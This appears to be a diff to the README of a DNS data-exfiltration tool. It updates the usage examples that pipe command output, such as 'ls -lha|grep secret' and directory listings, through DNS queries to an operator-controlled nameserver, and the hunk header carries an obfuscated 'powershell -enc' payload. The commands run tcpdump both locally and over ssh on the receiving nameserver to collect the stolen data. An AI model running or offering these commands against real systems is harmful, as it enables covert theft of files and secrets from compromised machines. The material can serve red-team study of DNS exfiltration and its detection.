@@ -23,15 +23,15 @@ powershell -enc UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAkACgAIgB7ADAAfQAuAHsA
 ## Usage
 1. Local testing for bash:
 ```bash
-./dns_data_exfiltration.sh -h whatev.er -d "dig @0 +tries=5" -x dispatcher.sh -c 'ls -lha|grep secret' -- stdbuf -oL tcpdump --immediate -l -i any udp port 53
+./dns_data_exfiltration.sh -h whatev.er -d "dig @0 +tries=5" -x dispatcher.sh -- 'ls -lha|grep secret' < <(stdbuf -oL tcpdump --immediate -l -i any udp port 53)
 ```
 
 Contents of dispatcher.sh:
 > $@
 
-2. Local testing for powershell (requires WSL2 for tcpdump):
+2. Local testing for powershell with WSL2:
 ```bash
-./dns_data_exfiltration.sh -w -h whatev.er -d "Resolve-DnsName -Server wsl2_IP -Name" -x dispatcher.sh -c 'gci | % {$_.Name}' -- stdbuf -oL tcpdump --immediate -l -i any udp port 53
+stdbuf -oL tcpdump --immediate -l -i any udp port 53|./dns_data_exfiltration.sh -w -h whatev.er -d "Resolve-DnsName -Server wsl2_IP -Name" -x dispatcher.sh -- 'gci | % {$_.Name}'
 ```
 
 Contents of dispatcher.sh:
@@ -39,7 +39,7 @@ Contents of dispatcher.sh:
 
 3. powershell example where we ssh into our NS to get the incoming DNS requests.
 ```bash
-./dns_data_exfiltration.sh -w -h yourdns.ns -d "Resolve-DnsName" -x dispatcher.sh -c 'gci | % {$_.Name}' -- stdbuf -oL ssh -i key user@HOST 'sudo tcpdump --immediate -l udp port 53'
+./dns_data_exfiltration.sh -w -h yourdns.ns -d "Resolve-DnsName" -x dispatcher.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
 ```
 
 Contents of dispatcher.sh
